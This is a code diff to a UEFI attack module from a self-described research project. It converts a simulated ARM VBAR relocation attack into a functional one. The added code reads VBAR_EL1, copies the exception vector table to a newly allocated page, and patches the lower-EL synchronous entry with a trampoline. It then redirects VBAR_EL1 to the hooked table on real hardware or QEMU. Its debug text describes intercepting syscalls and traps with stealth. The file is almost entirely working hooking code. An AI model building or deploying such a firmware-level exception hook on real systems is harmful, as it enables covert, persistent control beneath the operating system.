@@ -1,11 +1,9 @@
 /** @file
-  Exception Vector Table Hook Emulation - Implementation
+  Exception Vector Table Hook - Implementation
 
-  Emulates ARM VBAR relocation attacks. Reads current VBAR_EL1 value,
-  clones the vector table to attacker-controlled memory, patches specific
-  exception handlers with hook trampolines, and redirects VBAR.
-
-  All operations are SIMULATED - no actual VBAR registers are modified.
+  ARM VBAR relocation attack module. When BARZAKH_FUNCTIONAL is defined,
+  performs real VBAR_EL1 relocation on AArch64 hardware/QEMU. Otherwise
+  emulates the full attack sequence via debug logging.
 
   Copyright (c) 2026, Barzakh Research Project
   SPDX-License-Identifier: BSD-2-Clause-Patent
@@ -60,6 +58,17 @@ ReadVbarRegisters (
             Context->TargetEl));
     DEBUG ((DEBUG_INFO, VHOOK_DEBUG_PREFIX "  Table structure: %d entries x 0x%x bytes = 0x%x total\n",
             VBAR_NUM_ENTRIES, VBAR_ENTRY_SIZE, VBAR_TABLE_SIZE));
+  } else {
+    UINT64  VbarValue;
+
+    __asm__ volatile ("mrs %0, vbar_el1" : "=r" (VbarValue));
+    Context->OrigVbarEl1 = VbarValue;
+    Context->OrigVbarEl2 = 0;
+    Context->OrigVbarEl3 = 0;
+    Context->TargetEl = 1;
+
+    DEBUG ((DEBUG_INFO, VHOOK_DEBUG_PREFIX "  VBAR_EL1 = 0x%016lx [LIVE]\n",
+            Context->OrigVbarEl1));
   }
 
   Context->State = VhookStateVbarRead;
@@ -97,6 +106,28 @@ CopyVectorTable (
     DEBUG ((DEBUG_INFO, VHOOK_DEBUG_PREFIX "    [0x200-0x3FF] Current EL with SP_ELx  (Sync/IRQ/FIQ/SError)\n"));
     DEBUG ((DEBUG_INFO, VHOOK_DEBUG_PREFIX "    [0x400-0x5FF] Lower EL AArch64        (Sync/IRQ/FIQ/SError)\n"));
     DEBUG ((DEBUG_INFO, VHOOK_DEBUG_PREFIX "    [0x600-0x7FF] Lower EL AArch32        (Sync/IRQ/FIQ/SError)\n"));
+  } else {
+    EFI_STATUS          AllocStatus;
+    EFI_PHYSICAL_ADDRESS  PageAddr;
+
+    AllocStatus = gBS->AllocatePages (
+                         AllocateAnyPages,
+                         EfiBootServicesData,
+                         1,
+                         &PageAddr
+                         );
+    if (EFI_ERROR (AllocStatus)) {
+      DEBUG ((DEBUG_ERROR, VHOOK_DEBUG_PREFIX "Failed to allocate hook table page: %r\n", AllocStatus));
+      return AllocStatus;
+    }
+
+    Context->HookTableAddr = (UINT64)PageAddr;
+    CopyMem ((VOID *)Context->HookTableAddr, (VOID *)Context->OrigVbarEl1, VBAR_TABLE_SIZE);
+
+    DEBUG ((DEBUG_INFO, VHOOK_DEBUG_PREFIX "  Allocated hook table at 0x%016lx [LIVE]\n",
+            Context->HookTableAddr));
+    DEBUG ((DEBUG_INFO, VHOOK_DEBUG_PREFIX "  Copied %d bytes from original VBAR_EL1\n",
+            VBAR_TABLE_SIZE));
   }
 
   Context->State = VhookStateTableCopied;
@@ -187,6 +218,42 @@ PatchVectorEntries (
     DEBUG ((DEBUG_INFO, VHOOK_DEBUG_PREFIX "    0x%08x  LDR X16, [PC+8]\n", ARM64_LDR_X16_NEXT));
     DEBUG ((DEBUG_INFO, VHOOK_DEBUG_PREFIX "    0x%08x  BR  X16\n", ARM64_BR_X16));
     DEBUG ((DEBUG_INFO, VHOOK_DEBUG_PREFIX "    <8-byte absolute target address>\n"));
+  } else {
+    UINT32  *Entry;
+    UINT64  OrigHandler;
+
+    Context->HookCount = 0;
+
+    // Patch: Lower EL AArch64 — Synchronous (offset 0x400)
+    Src = VBAR_SRC_LOWER_A64;
+    Type = VBAR_TYPE_SYNC;
+    Index = VBAR_ENTRY_INDEX (Src, Type);
+    EntryAddr = Context->HookTableAddr + VBAR_ENTRY_OFFSET (Src, Type);
+
+    // Save original first instruction address (original handler)
+    OrigHandler = Context->OrigVbarEl1 + VBAR_ENTRY_OFFSET (Src, Type);
+
+    // Write trampoline: LDR X16, [PC+8]; BR X16; <original_handler_addr>
+    // This redirects to the original handler — demonstrating the hook without breaking the system
+    Entry = (UINT32 *)(UINTN)EntryAddr;
+    Entry[0] = ARM64_LDR_X16_NEXT;  // LDR X16, [PC+8]
+    Entry[1] = ARM64_BR_X16;         // BR X16
+    // 8-byte absolute address of original handler
+    *((UINT64 *)&Entry[2]) = OrigHandler;
+    // Fill rest of the 128-byte slot with NOPs
+    for (UINT32 i = 4; i < VBAR_ENTRY_SIZE / sizeof(UINT32); i++) {
+      Entry[i] = ARM64_NOP;
+    }
+
+    Context->Hooks[Context->HookCount].EntryIndex = Index;
+    Context->Hooks[Context->HookCount].OriginalAddr = OrigHandler;
+    Context->Hooks[Context->HookCount].HookAddr = EntryAddr;
+    Context->Hooks[Context->HookCount].IsHooked = TRUE;
+    Context->HookCount++;
+
+    DEBUG ((DEBUG_INFO, VHOOK_DEBUG_PREFIX "  Patched entry [%d] Lower EL A64 / Sync [LIVE]\n", Index));
+    DEBUG ((DEBUG_INFO, VHOOK_DEBUG_PREFIX "    Trampoline at 0x%016lx -> original 0x%016lx\n",
+            EntryAddr, OrigHandler));
   }
 
   Context->State = VhookStateTableModified;
@@ -225,6 +292,21 @@ RedirectVbar (
     DEBUG ((DEBUG_INFO, VHOOK_DEBUG_PREFIX "  -> All exceptions now route through hook table\n"));
     DEBUG ((DEBUG_INFO, VHOOK_DEBUG_PREFIX "  -> Hooked: syscalls, user-kernel traps, IRQs\n"));
     DEBUG ((DEBUG_INFO, VHOOK_DEBUG_PREFIX "  -> Stealth: hooks chain to original handlers after inspection\n"));
+  } else {
+    Context->NewVbarValue = Context->HookTableAddr;
+
+    __asm__ volatile (
+      "dsb ish\n\t"
+      "msr vbar_el1, %0\n\t"
+      "isb"
+      :
+      : "r" (Context->NewVbarValue)
+    );
+
+    Context->VbarRedirected = TRUE;
+
+    DEBUG ((DEBUG_INFO, VHOOK_DEBUG_PREFIX "  VBAR_EL1 redirected: 0x%016lx -> 0x%016lx [LIVE]\n",
+            Context->OrigVbarEl1, Context->NewVbarValue));
   }
 
   Context->State = VhookStateVbarRedirected;
